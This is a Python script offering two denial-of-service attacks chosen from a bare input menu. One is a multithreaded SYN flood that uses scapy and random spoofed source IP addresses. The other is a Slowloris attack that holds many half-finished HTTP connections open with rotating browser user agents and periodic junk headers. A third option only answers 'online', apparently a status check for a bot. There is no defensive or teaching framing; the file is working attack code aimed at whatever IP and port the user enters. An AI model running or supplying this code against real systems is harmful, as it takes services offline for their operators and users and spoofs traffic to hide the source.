#!/usr/bin/python3

import random
import threading
from scapy.all import IP, TCP, send
import time
import socket

choose = input('')

def ping():
    return 'online'

class Synflood:
    def __init__(self, ip, port, thread, pack=50):
        self.target = ip
        self.port = port
        self.thread = thread
        self.event = threading.Event()
        self.packet = pack

    def start(self, port="80"):
        t_end = time.time() + 10
        self.event.set()
        while time.time() < t_end:
            for i in range(self.packet):
                fake_ip = "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
                rand_port = random.randint(0, 65535)
                send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port), verbose=0)
        print("Thread finished\n")

    def sf(self):
        threads = []
        for i in range(self.thread):
            th = threading.Thread(target=self.start)
            th.start()
            threads.append(th)
        return threads

    def stop(self):
        self.event.clear()

class Slowloris:
    def __init__(self, ip, port):
        self.target = ip
        self.port = port
        self.ua = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
        ]
        setattr(socket.socket, "send_line", self.send_line)
        setattr(socket.socket, "send_header", self.send_header)

    def send_line(self, sock, line):
        sock.send(f"{line}\r\n".encode("utf-8"))

    def send_header(self, sock, name, value):
        self.send_line(sock, f"{name}: {value}")

    def init_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((self.target, self.port))
        self.send_line(sock, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        self.send_header(sock, "User-Agent", random.choice(self.ua))
        self.send_header(sock, "Accept-language", "en-US,en;q=0.5")
        return sock

if choose == '1':
    ip = input('IP: ')
    port = int(input('Port: '))
    threadd = int(input('Threads: '))
    pack = int(input('Packets: '))
    syn = Synflood(ip, port, threadd, pack)
    try:
        syn.sf()
    except KeyboardInterrupt:
        syn.stop()
elif choose == '2':
    t_end = time.time() + 10
    ip = input('IP: ')
    port = int(input('Port: '))
    sockk = int(input('Number of sockets: '))
    packk = int(input('Number of packets: '))
    lor = Slowloris(ip, port)
    list_of_sockets = []
    for _ in range(sockk):
        try:
            sock = lor.init_socket()
        except socket.error:
            break
        list_of_sockets.append(sock)
    while time.time() < t_end:
        for sock in list(list_of_sockets):
            try:
                lor.send_header(sock, "X-a", str(random.randint(1, 5000)))
            except socket.error:
                list_of_sockets.remove(sock)
                try:
                    sock = lor.init_socket()
                    list_of_sockets.append(sock)
                except socket.error:
                    continue
elif choose == '3':
    print('online')